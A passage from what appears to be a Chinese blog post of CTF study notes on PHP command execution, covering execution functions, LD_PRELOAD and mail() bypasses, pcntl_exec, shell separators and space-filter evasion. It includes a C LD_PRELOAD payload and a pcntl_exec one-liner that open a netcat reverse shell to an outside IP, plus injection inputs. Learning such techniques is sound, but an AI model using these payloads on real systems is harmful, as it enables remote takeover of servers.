href="#dir%E5%8F%8A-%E5%92%8Crev"><span class="toc-number">11.6.</span> <span class="toc-text">dir及 *和rev</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x13%E9%95%BF%E5%BA%A6%E4%B8%BA7%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">12.</span> <span class="toc-text">0x13长度为7绕过方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x14%E9%95%BF%E5%BA%A6%E4%B8%BA5"><span class="toc-number">13.</span> <span class="toc-text">0x14长度为5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x15%E9%95%BF%E5%BA%A6%E4%B8%BA4"><span class="toc-number">14.</span> <span class="toc-text">0x15长度为4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x16%E6%97%A0%E5%8F%82%E6%95%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">15.</span> <span class="toc-text">0x16无参数命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP%E8%AF%B7%E6%B1%82%E5%A4%B4%E7%BB%95%E8%BF%87-php7-3"><span class="toc-number">15.1.</span> <span class="toc-text">HTTP请求头绕过(php7.3)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x17%E6%97%A0%E5%8F%82%E6%95%B0%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8FRCE-php5-7"><span class="toc-number">16.</span> <span class="toc-text">0x17无参数全局变量RCE(php5&#x2F;7)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x18%E6%97%A0%E5%8F%82%E6%95%B0session-RCE"><span class="toc-number">17.</span> <span class="toc-text">0x18无参数session RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8session-php5"><span class="toc-number">17.1.</span> <span class="toc-text">利用session(php5)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AAA%E5%81%B7%E6%B8%A1%E9%98%B4%E5%B9%B3%EF%BC%88%E5%A4%8D%E4%BB%87%EF%BC%89%E4%B8%8E%E6%9C%AC%E9%9D%B6%E5%9C%BA%E7%9A%84%E6%AF%94%E8%BE%83"><span class="toc-number">17.2.</span> <span class="toc-text">AAA偷渡阴平（复仇）与本靶场的比较</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x19%E6%97%A0%E5%8F%82%E6%95%B0scandir%E8%AF%BB%E5%8F%96"><span class="toc-number">18.</span> <span class="toc-text">0x19无参数scandir读取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95"><span class="toc-number">18.1.</span> <span class="toc-text">当前目录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#scandir"><span class="toc-number">18.1.1.</span> <span class="toc-text">scandir()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#getcwd"><span class="toc-number">18.1.2.</span> <span class="toc-text">getcwd</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E7%BA%A7%E7%9B%AE%E5%BD%95"><span class="toc-number">18.2.</span> <span class="toc-text">上级目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B9%E7%9B%AE%E5%BD%95"><span class="toc-number">18.3.</span> <span class="toc-text">根目录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x20%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97%E7%BB%95%E8%BF%87"><span class="toc-number">19.</span> <span class="toc-text">0x20无字母数字异或运算绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP5"><span class="toc-number">19.1.</span> <span class="toc-text">PHP5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP7"><span class="toc-number">19.2.</span> <span class="toc-text">PHP7</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x21%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87"><span class="toc-number">20.</span> <span class="toc-text">0x21无字母数字取反绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP5-1"><span class="toc-number">20.1.</span> <span class="toc-text">PHP5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP7-1"><span class="toc-number">20.2.</span> <span class="toc-text">PHP7</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x22%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E8%87%AA%E5%A2%9E%E7%BB%95%E8%BF%87"><span class="toc-number">21.</span> <span class="toc-text">0x22无字母数字自增绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP5-2"><span class="toc-number">21.1.</span> <span class="toc-text">PHP5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP7-2"><span class="toc-number">21.2.</span> <span class="toc-text">PHP7</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x23%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7%E8%BF%87%E6%BB%A4-php7"><span class="toc-number">22.</span> <span class="toc-text">0x23无字母数字特殊符号过滤(php7)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E4%B8%8B%E5%88%92%E7%BA%BF"><span class="toc-number">22.1.</span> <span class="toc-text">无字母数字下划线</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E4%B8%8B%E5%88%92%E7%BA%BF%E5%8F%8A-%E7%AC%A6%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-number">22.2.</span> <span class="toc-text">无字母数字下划线及$符号过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP7-3"><span class="toc-number">22.2.1.</span> <span class="toc-text">PHP7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP5-3"><span class="toc-number">22.2.2.</span> <span class="toc-text">PHP5</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-number">22.3.</span> <span class="toc-text">无字母数字过滤;~^&#96;&amp;|</span></a></li></ol></li></ol>
      
  </div>
</div>
</div>
          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="达达" class="lazyload">
  <div class="sidebar-author-name">达达</div>
  <div class="sidebar-description"></div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>文章</div>
    <div class="sidebar-state-number">14</div>
  </div>
  <div class="sidebar-state-category">
    <div>分类</div>
    <div class="sidebar-state-number">0</div>
  </div>
  <div class="sidebar-state-tag">
    <div>标签</div>
    <div class="sidebar-state-number">0</div>
  </div>
</div>
<div class="sidebar-social">
  
</div>
<div class="sidebar-menu">
  
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
        <div class="sidebar-menu-icon icon rotate">
          
            &#xe62b;
          
        </div>
        <div class="sidebar-menu-link">首页</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
        <div class="sidebar-menu-icon icon rotate">
          
            &#xe62b;
          
        </div>
        <div class="sidebar-menu-link">归档</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
        <div class="sidebar-menu-icon icon rotate">
          
            &#xe62b;
          
        </div>
        <div class="sidebar-menu-link">关于</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
        <div class="sidebar-menu-icon icon rotate">
          
            &#xe62b;
          
        </div>
        <div class="sidebar-menu-link">友链</div>
      </div>
    
  
</div>
</div>
        
      
      
        
          <div class="sidebar-btn-wrapper" style="position:static">
            <div class="sidebar-toc-btn current"></div>
            <div class="sidebar-common-btn"></div>
          </div>
        
      
    </div>
  </div>

  <div class="sidebar-widget">
  
  </div>
  
</aside>

          <section id="main"><article id="post-php命令执行" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-inner" data-aos="fade-up">
    <div class="article-meta">
      <div class="article-date">
  <span class="article-date-link" data-aos="zoom-in">
    <time datetime="2025-04-30T04:03:11.697Z" itemprop="datePublished">2025-04-30</time>
    <time style="display: none;" id="post-update-time">2025-05-05</time>
  </span>
</div>

      

    </div>
    <div class="hr-line"></div>
    

    <div class="e-content article-entry" itemprop="articleBody">
      
      
        <h2 id="0x01命令执行函数介绍"><a href="#0x01命令执行函数介绍" class="headerlink" title="0x01命令执行函数介绍"></a>0x01命令执行函数介绍</h2><p>常见函数</p>
<p>system   exec   passthru   shell_exec   反引号   popen   proc_open   pcntl_exec</p>
<h3 id="system-有回显"><a href="#system-有回显" class="headerlink" title="system  有回显"></a>system  有回显</h3><p>system(string $command,int &amp;$return_var &#x3D; ?)</p>
<p>常用参数：</p>
<p>command：执行command参数所指定的目录，并且输出执行结果</p>
<p>如果提供rerurn_var参数，则外部命令执行后的返回状态将会被设置到此变量中</p>
<h3 id="exec-回显最后一行"><a href="#exec-回显最后一行" class="headerlink" title="exec  回显最后一行"></a>exec  回显最后一行</h3><p>exec（<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.string.php">字符串</a> <code>$command</code>， <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.array.php">数组</a> <code>&amp;$output</code> &#x3D; <strong><code>null</code></strong>， <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.integer.php">int</a> <code>&amp;$result_code</code> &#x3D; <strong><code>null</code></strong>）：</p>
<p><strong>exec（）</strong> 执行给定的 .<code>command</code></p>
<p>参数</p>
<ul>
<li><p><code>command</code></p>
<p>将要执行的命令。</p>
</li>
<li><p><code>output</code></p>
<p>如果存在该参数，则 指定的数组将填充 命令。尾随空格（如 ， ）不是 包含在此数组中。请注意，如果数组已经包含一些 元素中，<strong>exec（）</strong> 将附加到数组的末尾。 如果你不希望函数附加元素，请在将数组传递给 <strong>exec（）</strong> 之前对数组调用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.unset.php">unset（）。</a><code>output``\n</code></p>
</li>
<li><p><code>result_code</code></p>
<p>如果存在参数 以及参数，则 返回已执行命令的状态将写入此 变量。<code>result_code``output</code></p>
</li>
</ul>
<h3 id="passthru-有回显"><a href="#passthru-有回显" class="headerlink" title="passthru   有回显"></a>passthru   有回显</h3><p>passthru（<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.string.php">字符串</a> <code>$command</code>， <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.integer.php">int</a> <code>&amp;$result_code</code> &#x3D; <strong><code>null</code></strong>）： <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.null.php">？</a><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.singleton.php">假</a></p>
<p><strong>passthru（）</strong> 函数与 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.exec.php">exec（）</a> 函数类似，因为它都执行一个 .此功能 当 Unix 命令的输出时，应该使用 exec<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.exec.php">（）</a> 或 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.system.php">system（）</a> 是二进制数据，需要直接传递回 浏览器。此作的常见用途是执行类似于 PBMPlus实用程序。由 将 Content-type 设置为 和 然后调用 PBMPluss 程序输出一个 gif，可以创建 直接输出图像的 PHP 脚本。<code>command``image/gif</code></p>
<p>参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command</span><br></pre></td></tr></table></figure>

<ul>
<li><p>将要执行的命令。</p>
</li>
<li><p><code>result_code</code></p>
<p>如果存在该参数，则 返回状态将放在 Unix 命令的此处。<code>result_code</code></p>
</li>
</ul>
<h3 id="shell-exec-无回显"><a href="#shell-exec-无回显" class="headerlink" title="shell_exec  无回显"></a>shell_exec  无回显</h3><p>shell_exec（<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.string.php">字符串</a> <code>$command</code>）：<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.string.php">字符串</a>|<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.singleton.php">错误</a>|<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.null.php">零</a></p>
<p>参数</p>
<ul>
<li><p><code>command</code></p>
<p>将要执行的命令。</p>
</li>
</ul>
<p>返回值</p>
<p>一个<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.string.php">包含</a>已执行命令输出的字符串，**<code>如果</code>**管道 cannot established 或 <strong><code>null</code></strong>（如果发生错误或命令未生成任何输出）。</p>
<blockquote>
<p><strong>注意</strong>：</p>
<p>此函数可以在发生错误时返回 <strong><code>null</code></strong>，也可以返回程序 不产生任何输出。无法使用 这个函数。<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.exec.php">exec（）</a> 在访问 程序退出代码是必需的。</p>
</blockquote>
<p>使用echo  print等输出结果</p>
<h3 id="popen-无回显"><a href="#popen-无回显" class="headerlink" title="popen  无回显"></a>popen  无回显</h3><p>popen（<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.string.php">字符串</a> <code>$command</code>， <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.string.php">字符串</a> <code>$mode</code>）：<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.resource.php">资源</a>|<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.singleton.php">假</a></p>
<p>参数</p>
<h3 id="command"><a href="#command" class="headerlink" title="command"></a><code>command</code></h3><ul>
<li><p>命令</p>
</li>
<li><p><code>mode</code></p>
<p>模式。要么用于阅读，要么用于写作。<code>&#39;r&#39;``&#39;w&#39;</code>在 Windows 上，<strong>popen（）</strong> 默认为文本模式，即写入管道或从管道读取的任何字符都将被转换为 . 如果不需要，可以通过分别设置为 和 来强制执行二进制模式。<code>\n``\r\n``mode``&#39;rb&#39;``&#39;wb&#39;</code></p>
</li>
</ul>
<p>返回值</p>
<p>返回与 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.fopen.php">fopen（）</a> 返回的文件指针相同的文件指针，不同之处在于它是单向的（可能是 仅用于读取或写入），并且必须用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.pclose.php">pclose（）</a> 关闭。此指针可以与 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.fgets.php">fgets（）、</a><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.fgetss.php">fgetss（）</a> 和 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.fwrite.php">fwrite（）</a> 一起使用。当模式为 ‘r’ 时，返回的 file 指针等于命令的 STDOUT，当模式 是 ‘w’，则返回的文件指针等于 命令。</p>
<p>如果发生错误，则返回 <strong><code>false</code></strong>。</p>
<p>fgets获取内容  -&gt;  print_r输出内容</p>
<h3 id="proc-open-无回显"><a href="#proc-open-无回显" class="headerlink" title="proc_open  无回显"></a>proc_open  无回显</h3><p>proc_open（<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.array.php">数组</a>|<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.string.php">字符串</a> <code>$command</code>、<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.array.php">数组</a> <code>$descriptor_spec</code>、<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.array.php">数组</a> <code>&amp;$pipes</code>、<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.null.php">？</a><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.string.php">字符串</a> <code>$cwd</code> &#x3D; <strong><code>空</code></strong>，<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.null.php">？</a><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.array.php">数组</a> <code>$env_vars</code> &#x3D; <strong><code>空</code></strong><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.null.php">？</a><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.array.php">数组</a> <code>$options</code> &#x3D; <strong><code>null</code></strong>）：<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.resource.php">resource</a>|<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.singleton.php">假</a></p>
<p><strong>proc_open（）</strong> 类似于 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.popen.php">popen（），</a>但对程序执行的控制程度要大得多。</p>
<p>参数</p>
<ul>
<li><p><code>command</code></p>
<p>要作为<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.string.php">字符串</a>执行的命令行。特殊字符必须正确转义， 并且必须应用适当的引用。</p>
</li>
<li><p><code>descriptor_spec</code></p>
<p>一个索引数组，其中 key 表示描述符编号， value 表示 PHP 如何将该描述符传递给 child 过程。0 是 stdin，1 是 stdout，而 2 是 stderr。每个元素可以是：描述要传递给进程的管道的数组。第一个 元素是描述符类型，第二个元素是 给定的类型。有效类型包括 （第二个 元素是将 pipe 的读取端 传递给进程，或传递写入端）和（第二个元素是文件名）。 请注意，其他任何内容都被视为 .<code>pipe``r``w``file``w``r</code>表示真实文件描述符的流资源（例如，打开的文件、 套接字 **<code>STDIN）。</code>**文件描述符编号不限于 0、1 和 2 - 您可以 指定任何有效的文件描述符编号，它将被传递给 子进程。这允许您的脚本与其他 作为 “co-process” 运行的脚本。特别是，这对于 将密码短语传递给 PGP、GPG 和 openssl 等程序 安全的方式。它对于读取状态信息也很有用 由这些程序在辅助文件描述符上提供。</p>
</li>
<li><p><code>pipes</code></p>
<p>将设置为对应于 PHP 创建的任何管道的末尾。</p>
</li>
<li><p><code>cwd</code></p>
<p>命令的初始工作目录。这必须是<strong>绝对</strong>目录路径**&#96;&#96;，如果您想使用**默认值（当前 PHP 进程）</p>
</li>
<li><p><code>env_vars</code></p>
<p>一个数组，其中包含命令的环境变量，该命令将是 run 或 <strong><code>null</code></strong> 使用与当前 PHP 进程相同的环境</p>
</li>
<li><p><code>options</code></p>
<p>允许您指定其他选项。当前支持的选项 包括：<code>suppress_errors</code>（仅限 Windows）：禁止显示错误 由此函数在设置为 <strong><code>true</code></strong> 时生成<code>bypass_shell</code>（仅限 Windows）：设置为 <strong><code>true</code></strong> 时绕过 shell<code>cmd.exe``blocking_pipes</code>（仅限 Windows）：强制 设置为 <strong><code>true</code></strong> 时阻塞管道<code>create_process_group</code>（仅限 Windows）：允许 设置为 <strong><code>true</code></strong> 时处理事件的子进程<code>CTRL``create_new_console</code>（仅限 Windows）：新流程 具有新的控制台，而不是继承其父级的控制台</p>
</li>
</ul>
<p>返回值</p>
<p>返回表示进程的资源，完成后应使用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.proc-close.php">proc_close（）</a> 释放该资源。失败时 返回 <strong><code>false</code></strong>。</p>
<p>pcntl_exec（<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.string.php">字符串</a> <code>$path</code>， <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.array.php">数组</a> <code>$args</code> &#x3D; []， <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.array.php">数组</a> <code>$env_vars</code> &#x3D; []）： <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.types.boolean.php">布尔值</a></p>
<p>使用给定的参数执行程序。</p>
<p>参数</p>
<ul>
<li><p><code>path</code></p>
<p><code>path</code>必须是二进制可执行文件的路径，或者是 脚本，其有效路径指向 shebang （ #！&#x2F;usr&#x2F;local&#x2F;bin&#x2F;perl）作为第一行。查看系统的 man execve（2） 页面了解更多信息。</p>
</li>
<li><p><code>args</code></p>
<p><code>args</code>是传递给 程序。</p>
</li>
<li><p><code>env_vars</code></p>
<p><code>env_vars</code>是一个字符串数组，这些字符串以 环境添加到程序中。数组的格式为 name &#x3D;&gt; value， 键是环境变量的名称，值是 该变量的值。</p>
</li>
</ul>
<p>返回值</p>
<p>返回 <strong><code>false</code></strong>。</p>
<h2 id="0x02替换绕过函数过滤-过"><a href="#0x02替换绕过函数过滤-过" class="headerlink" title="0x02替换绕过函数过滤(过)"></a>0x02替换绕过函数过滤(过)</h2><h2 id="0x03LD-PRELOAD绕过"><a href="#0x03LD-PRELOAD绕过" class="headerlink" title="0x03LD_PRELOAD绕过"></a>0x03LD_PRELOAD绕过</h2><p><img src="/../picture/Screenshot_20250429_153909.jpg" alt="Screenshot_20250429_153909"></p>
<p><img src="/../picture/Screenshot_20250429_153927.jpg" alt="Screenshot_20250429_153927"></p>
<p><img src="/../picture/Screenshot_20250429_153954.jpg" alt="Screenshot_20250429_153954"></p>
<h2 id="0x04mail-函数命令"><a href="#0x04mail-函数命令" class="headerlink" title="0x04mail()函数命令"></a>0x04mail()函数命令</h2><p><img src="/../picture/Screenshot_20250429_154005.jpg" alt="Screenshot_20250429_154005"></p>
<p><img src="/../picture/Screenshot_20250429_154053.jpg" alt="Screenshot_20250429_154053"></p>
<p><img src="/../picture/Screenshot_20250429_154119.jpg" alt="Screenshot_20250429_154119"></p>
<p><img src="/../picture/Screenshot_20250429_154211.jpg" alt="Screenshot_20250429_154211"></p>
<p><img src="/../picture/Screenshot_20250429_154303.jpg" alt="Screenshot_20250429_154303"></p>
<p><img src="/../picture/Screenshot_20250429_154344.jpg" alt="Screenshot_20250429_154344"></p>
<p><img src="/../picture/Screenshot_20250429_154433.jpg" alt="Screenshot_20250429_154433"></p>
<p><img src="/../picture/Screenshot_20250429_154513.jpg" alt="Screenshot_20250429_154513"></p>
<p><img src="/../picture/Screenshot_20250429_154610.jpg" alt="Screenshot_20250429_154610"></p>
<p><img src="/../picture/image-20250429194350746.png" alt="image-20250429194350746"></p>
<p>这个题就是</p>
<p>写一个demo.c文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void payload()&#123;</span><br><span class="line">  system(&quot;nc 121.40.70.148 -e /bin/bash&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int geteuid()</span><br><span class="line">&#123;</span><br><span class="line">  unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">  payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>demo.php文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">putenv(&quot;LD_PRELOAD=./demo.so&quot;);</span><br><span class="line">mail(&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>用kali生成demo.so文件</p>
<p><img src="/../picture/image-20250429194659782.png" alt="image-20250429194659782"></p>
<p>将demo.php和demo.so文件一起通过蚁剑上传</p>
<p>这里是留着后门的</p>
<p><img src="/../picture/image-20250429194921050.png" alt="image-20250429194921050"></p>
<p><img src="/../picture/image-20250429195013370.png" alt="image-20250429195013370"></p>
<p>上传成功   开启服务器监听   然后去访问demo.php网页</p>
<p><img src="/../picture/image-20250429195842719.png" alt="image-20250429195842719"></p>
<p>监听成功</p>
<p>下面这是给的第二种方法</p>
<p><img src="/../picture/Screenshot_20250429_154813.jpg" alt="Screenshot_20250429_154813"></p>
<p><img src="/../picture/Screenshot_20250429_154833.jpg" alt="Screenshot_20250429_154833"></p>
<p><img src="/../picture/Screenshot_20250429_154904.jpg" alt="Screenshot_20250429_154904"></p>
<h2 id="0x05蚁剑及pcntl绕过函数过滤"><a href="#0x05蚁剑及pcntl绕过函数过滤" class="headerlink" title="0x05蚁剑及pcntl绕过函数过滤"></a>0x05蚁剑及pcntl绕过函数过滤</h2><p>这里还是上面那个题    通过蚁剑插件来解题    或者  pcntl函数</p>
<h3 id="antsword"><a href="#antsword" class="headerlink" title="antsword"></a>antsword</h3><p><img src="/../picture/Screenshot_20250429_200502.jpg" alt="Screenshot_20250429_200502"></p>
<p><img src="/../picture/Screenshot_20250429_200607.jpg" alt="Screenshot_20250429_200607"></p>
<p><img src="/../picture/Screenshot_20250429_200618.jpg" alt="Screenshot_20250429_200618"></p>
<p><img src="/../picture/Screenshot_20250429_201130.jpg" alt="Screenshot_20250429_201130"></p>
<h3 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec"></a>pcntl_exec</h3><p><img src="/../picture/Screenshot_20250429_201350.jpg" alt="Screenshot_20250429_201350"></p>
<p><img src="/../picture/Screenshot_20250429_201529.jpg" alt="Screenshot_20250429_201529"></p>
<p><img src="/../picture/Screenshot_20250429_201559.jpg" alt="Screenshot_20250429_201559"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=pcntl_exec(&quot;/bin/bash&quot;,array(&quot;-c&quot;,&quot;nc 121.40.70.148 2333 -e /bin/bash&quot;));</span><br></pre></td></tr></table></figure>

<p>反弹成功</p>
<p><img src="/../picture/image-20250429203823103.png" alt="image-20250429203823103"></p>
<h2 id="0x06操作系统链接符"><a href="#0x06操作系统链接符" class="headerlink" title="0x06操作系统链接符"></a>0x06操作系统链接符</h2><h3 id=""><a href="#" class="headerlink" title=";"></a>;</h3><p>使多个命令按顺序执行</p>
<p>前面的命令和后面的命令都会执行</p>
<h3 id="URL编码-26"><a href="#URL编码-26" class="headerlink" title="&amp;   URL编码  %26"></a>&amp;   URL编码  %26</h3><p>使命令在后台运行 </p>
<p>这样就可以同时执行多条命令</p>
<p>第一条命令无法执行成功  则后面的命令也无法执行</p>
<p>执行的时候要进行一下url编码  不然后面的命令无法执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%26id</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250421223103445.png" alt="image-20250421223103445"></p>
<h3 id="-1"><a href="#-1" class="headerlink" title="|"></a>|</h3><p>将前面的命令的输出作为后面命令的输入，把前面命令的结果当成后面命令的参数；</p>
<p>前面的命令和后面的命令都会执行，但只显示后面的命令执行结果</p>
<p><img src="/../picture/image-20250421223316794.png" alt="image-20250421223316794"></p>
<h3 id="-2"><a href="#-2" class="headerlink" title="||"></a>||</h3><p>类似于程序中的if-else语句。</p>
<p>若前面的命令执行成功，则后面的命令就不会执行；</p>
<p>若前面的命令执行失败，则执行后面的命令。</p>
<p><img src="/../picture/image-20250421223621079.png" alt="image-20250421223621079"></p>
<h2 id="0x07-空格过滤绕过"><a href="#0x07-空格过滤绕过" class="headerlink" title="0x07.空格过滤绕过"></a>0x07.空格过滤绕过</h2><h3 id="1-大括号-car-flag-txt"><a href="#1-大括号-car-flag-txt" class="headerlink" title="1.大括号{car,flag.txt};"></a>1.大括号{car,flag.txt};</h3><h3 id="2-IFS代替空格；-IFS、-IFS-、-IFS-9"><a href="#2-IFS代替空格；-IFS、-IFS-、-IFS-9" class="headerlink" title="2.$IFS代替空格；$IFS、${IFS}、$IFS$9"></a>2.$IFS代替空格；$IFS、${IFS}、$IFS$9</h3><p>Linux下有一个特殊的环境变量叫做IFS , 叫做内部字段分隔符（internal field separator）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=ls$IFS-l</span><br></pre></td></tr></table></figure>

<p>单纯$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=ls$&#123;IFS&#125;-l</span><br></pre></td></tr></table></figure>

<p>$IFS$9-后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=ls$IFS$9-l</span><br></pre></td></tr></table></figure>

<h3 id="3-重定向字符"><a href="#3-重定向字符" class="headerlink" title="3.重定向字符 &lt;, &lt;&gt;;"></a>3.重定向字符 &lt;, &lt;&gt;;</h3><p>“&lt;”表示的是输入重定向的意思，就是把&lt;后面跟的文件取代键盘作为新的输入设备。</p>
